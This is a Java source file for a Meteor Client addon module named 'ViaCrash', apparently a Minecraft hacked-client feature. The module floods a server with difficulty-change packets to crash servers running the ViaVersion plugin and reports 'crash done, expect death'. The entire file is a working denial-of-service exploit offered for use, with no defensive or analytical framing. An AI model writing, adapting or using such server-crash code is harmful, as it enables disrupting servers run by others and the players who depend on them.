package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.network.packet.c2s.play.UpdateDifficultyC2SPacket;
import net.minecraft.world.Difficulty;

public class ViaCrash extends Module {
    int index;
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("ppe")       // name in GUI
        .description("How many packets to send") // tooltip
        .defaultValue(1)                // default value
        .min(1)                         // minimum slider value
        .max((int) Double.POSITIVE_INFINITY)                       // maximum slider value
        .sliderMax(100)                 // slider drag limit
        .build()
    );
    public ViaCrash() {
        super(AddonTemplate.CATEGORY, "via-crash", "Crash server with ViaVersion");
    }

    @Override
    public void onActivate() {
        index = 0;
        if (mc.getNetworkHandler() == null) return;
        for (int i = 0; i < packets.get(); i++) {
            mc.getNetworkHandler().sendPacket(new UpdateDifficultyC2SPacket(Difficulty.byId(index)));
            index = (index + 1) % 4;
        }
        info("crash done, expect death");
        this.toggle();
    }


}
